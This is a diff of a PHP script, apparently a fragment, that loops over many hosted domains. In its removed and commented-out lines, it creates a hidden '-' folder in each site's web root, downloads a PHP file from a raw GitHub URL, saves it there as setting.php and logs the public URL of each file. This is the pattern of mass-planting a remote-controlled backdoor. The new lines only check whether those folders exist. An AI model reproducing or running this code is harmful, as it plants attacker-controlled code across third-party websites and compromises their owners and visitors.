@@ -33,18 +33,23 @@ foreach ($homes as $key => $home) {
 $results = [];
 
 foreach ($targets as $target) {
-    mkdir($target['path'] . '/-');
+    $dir = $target['path'] . '/-';
+    // mkdir($target['path'] . '/-');
 
-    $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/setting.php');
-    $file = $target['path'] . '/-/setting.php';
-    $res = file_put_contents($file, $response);
+    // $response = file_get_contents('https://raw.githubusercontent.com/jazzplunker97/trash/main/legacy.php');
+    // $file = $target['path'] . '/-/setting.php';
+    // $res = file_put_contents($file, $response);
 
-    $results[$target['domain']] = [
-        'size' => $res,
-        'domain' => $target['domain'],
-        'path' => $target['path'],
-        'url' => $target['domain'] . '/-/setting.php'
-    ];
+    // $results[$target['domain']] = [
+    //     'size' => $res,
+    //     'domain' => $target['domain'],
+    //     'path' => $target['path'],
+    //     'url' => $target['domain'] . '/-/setting.php'
+    // ];
+
+    if (!isset($results[$target['domain']])) {
+        $results[$dir] = file_exists($dir) && is_dir($dir);
+    }
 }
 
 dd($results);
